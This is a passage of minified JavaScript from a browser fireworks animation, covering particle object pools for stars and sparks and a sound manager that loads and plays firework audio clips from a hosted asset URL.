a=this._pool.pop()||this._new();return a.x=e,a.y=t,a.radius=r,this.active.push(a),a},returnInstance(e){this._pool.push(e)}};function createParticleCollection(){const e={};return COLOR_CODES_W_INVIS.forEach((t=>{e[t]=[]})),e}const Star={drawWidth:3,airDrag:.98,airDragHeavy:.992,active:createParticleCollection(),_pool:[],_new:()=>({}),add(e,t,r,a,o,s,n,i){const l=this._pool.pop()||this._new();return l.visible=!0,l.heavy=!1,l.x=e,l.y=t,l.prevX=e,l.prevY=t,l.color=r,l.speedX=Math.sin(a)*o+(n||0),l.speedY=Math.cos(a)*o+(i||0),l.life=s,l.fullLife=s,l.spinAngle=Math.random()*PI_2,l.spinSpeed=.8,l.spinRadius=0,l.sparkFreq=0,l.sparkSpeed=1,l.sparkTimer=0,l.sparkColor=r,l.sparkLife=750,l.sparkLifeVariation=.25,l.strobe=!1,this.active[r].push(l),l},returnInstance(e){e.onDeath&&e.onDeath(e),e.onDeath=null,e.secondColor=null,e.transitionTime=0,e.colorChanged=!1,this._pool.push(e)}},Spark={drawWidth:0,airDrag:.9,active:createParticleCollection(),_pool:[],_new:()=>({}),add(e,t,r,a,o,s){const n=this._pool.pop()||this._new();return n.x=e,n.y=t,n.prevX=e,n.prevY=t,n.color=r,n.speedX=Math.sin(a)*o,n.speedY=Math.cos(a)*o,n.life=s,this.active[r].push(n),n},returnInstance(e){this._pool.push(e)}},soundManager={baseURL:"https://s3-us-west-2.amazonaws.com/s.cdpn.io/329180/",ctx:new(window.AudioContext||window.webkitAudioContext),sources:{lift:{volume:1,playbackRateMin:.85,playbackRateMax:.95,fileNames:["lift1.mp3","lift2.mp3","lift3.mp3"]},burst:{volume:1,playbackRateMin:.8,playbackRateMax:.9,fileNames:["burst1.mp3","burst2.mp3"]},burstSmall:{volume:.25,playbackRateMin:.8,playbackRateMax:1,fileNames:["burst-sm-1.mp3","burst-sm-2.mp3"]},crackle:{volume:.2,playbackRateMin:1,playbackRateMax:1,fileNames:["crackle1.mp3"]},crackleSmall:{volume:.3,playbackRateMin:1,playbackRateMax:1,fileNames:["crackle-sm-1.mp3"]}},preload(){const e=[];function t(e){if(e.status>=200&&e.status<300)return e;const t=new Error(e.statusText);throw t.response=e,t}return Object.keys(this.sources).forEach((r=>{const a=this.sources[r],{fileNames:o}=a,s=[];o.forEach((r=>{const a=this.baseURL+r,o=fetch(a).then(t).then((e=>e.arrayBuffer())).then((e=>new Promise((t=>{this.ctx.decodeAudioData(e,t)}))));s.push(o),e.push(o)})),Promise.all(s).then((e=>{a.buffers=e}))})),Promise.all(e)},pauseAll(){this.ctx.suspend()},resumeAll(){this.playSound("lift",0),setTimeout((()=>{this.ctx.resume()}),250)},_lastSmallBurstTime:0,playSound(e,t=1){if(t=MyMath.clamp(t,0,1),!canPlaySoundSelector()||simSpeed<.95)return;if("burstSmall"===e){const e=Date.now();if(e-this._lastSmallBurstTime<20)return;this._lastSmallBurstTime=e}const r=this.sources[e];if(!r)throw new Error(`Sound of type "${e}" doesn't exist.`);const a=r.volume*t,o=MyMath.random(r.playbackRateMin,r.playbackRateMax)*(2-t),s=this.ctx.createGain();s.gain.value=a;const n=MyMath.randomChoice(r.buffers),i=this.ctx.createBufferSource();i.playbackRate.value=o,i.buffer=n,i.connect(s),s.connect(this.ctx.destination),i.start(0)}};function setLoadingStatus(e){}IS_HEADER?init():(setLoadingStatus(""),setTimeout((()=>{soundManager.preload().then(init,(e=>(init(),Promise.reject(e))))}),0));